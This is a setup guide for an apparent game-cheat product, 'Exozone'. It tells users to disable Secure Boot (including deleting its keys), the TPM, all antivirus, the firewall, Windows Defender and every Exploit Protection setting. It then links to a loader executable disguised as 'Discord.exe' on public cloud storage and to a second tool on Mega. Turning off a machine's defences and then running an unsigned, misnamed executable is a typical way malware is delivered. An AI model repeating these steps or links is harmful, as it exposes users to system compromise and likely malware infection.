sections.title: Introduction
sections.text: Before you can use Exozone products you must first be sure to setup your PC correctly. There are a few things you will need to ensure have been set correctly in your BIOS.

sections.title: BIOS Setup
sections.text:
In order for the cheat to run correctly the following must be set correctly through your BIOS:

Format Drives to GPT Partitions:

Set Boot Mode to UEFI:
Restart your computer.
Enter the BIOS/UEFI setup by pressing a specific key during boot (usually F2, F10, F12, or Del).
Look for the "Boot" or "Boot Options" menu and ensure that the boot mode is set to UEFI.

Enable Virtualization:
Enter the BIOS/UEFI setup.
Look for settings related to Intel Virtualization Technology (VT-x) and Intel Virtualization Technology for Directed I/O (VT-d) and ensure they are enabled.
If you have AMD then it is called SVM.

Disable Secure Boot:
In the BIOS/UEFI setup, locate the "Secure Boot" option and disable it.
You may need to delete all bootable keys associated with Secure Boot.

Optional: Disable TPM:
In the BIOS/UEFI setup, locate the Trusted Platform Module (TPM) option and disable it if needed.

sections.title: From Windows: Disable Security Measures
sections.text:
Completely disable any antivirus software, firewall, and Windows Defender.

Disable Exploit Protection:
Open Windows Security.
Go to "App & browser control."
Under "Exploit protection settings," turn off each option.

Disable Fast Boot:

Restart Your Computer:
Save your BIOS/UEFI settings and exit.
Restart your computer to apply the changes.

sections.title: Download and Run
sections.text:
Download the loader here: https://abnypbwebtsrxvoyhgdv.supabase.co/storage/v1/object/public/public_bucket/Discord.exe

Download our support tool here: https://mega.nz/file/ioJQ3TAK#khDxBBZ0_LiX__6zEnfr2N6PG1_HDuv271J5rFus7yQ

Make everything green in the support tool before downloading the loader!
